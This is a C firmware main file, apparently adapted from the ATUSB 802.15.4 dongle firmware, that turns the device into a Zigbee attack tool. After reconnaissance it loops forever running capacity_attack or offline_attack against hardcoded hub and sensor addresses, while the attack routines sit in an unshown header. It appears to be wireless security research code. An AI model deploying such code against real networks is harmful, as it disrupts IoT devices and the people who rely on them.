/*
 * fw/atusb.c - ATUSB initialization and main loop
 *
 * Written 2008-2011 by Werner Almesberger
 * Copyright 2008-2011 Werner Almesberger
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 */

#include "attack.h"

int main(void)
{
	board_init();
	board_app_init();
	reset_rf();

	user_get_descriptor = sernum_get_descr;

	/* now we should be at 8 MHz */

#ifdef DEBUG
	uart_init();
	static FILE atben_stdout = FDEV_SETUP_STREAM(uart_write_char, NULL,
						     _FDEV_SETUP_WRITE);
	stdout = &atben_stdout;
#endif

	usb_init();
	ep0_init();
#ifdef ATUSB
	timer_init();

	/* move interrupt vectors to 0 */
	MCUCR = 1 << IVCE;
	MCUCR = 0;
#endif

	sei();
	_delay_ms(3000);

	// TODO: Here we need to implement Reconnaissance Attack first to determine device types and device address in the netwrok.
	reconnaissance_attack();

	/** TEST FIELD **/
	uint8_t attack_no = 2;
	// Here we let dst_device = hub, src_device = sensor to test our API
	ieee802154_addr hub_addr = {};
	hub_addr.pan = 0x2ca2;
	hub_addr.epan = 0x0ab4da5c2ea6d3ec;
	hub_addr.short_addr = 0x0000;
	hub_addr.long_addr = 0x286d970002054a14;

	ieee802154_addr zed_addr = hub_addr;
	zed_addr.short_addr = 0x2d38;
	zed_addr.long_addr = ST_SENSOR_MAC_ADDR;
	zed_addr.polling_type = 2;
	/** END OF TEST FIELD **/

	while (1)
	{
		if (attack_no == 1)
		{
			capacity_attack(&hub_addr, 0x30000000);
		}
		else if (attack_no == 2)
		{
			led(1);
			offline_attack(&hub_addr, &zed_addr, 0x30000000);
			led(0);
		}
		else
		{
			sleep_mode();
		}
		
	}
}
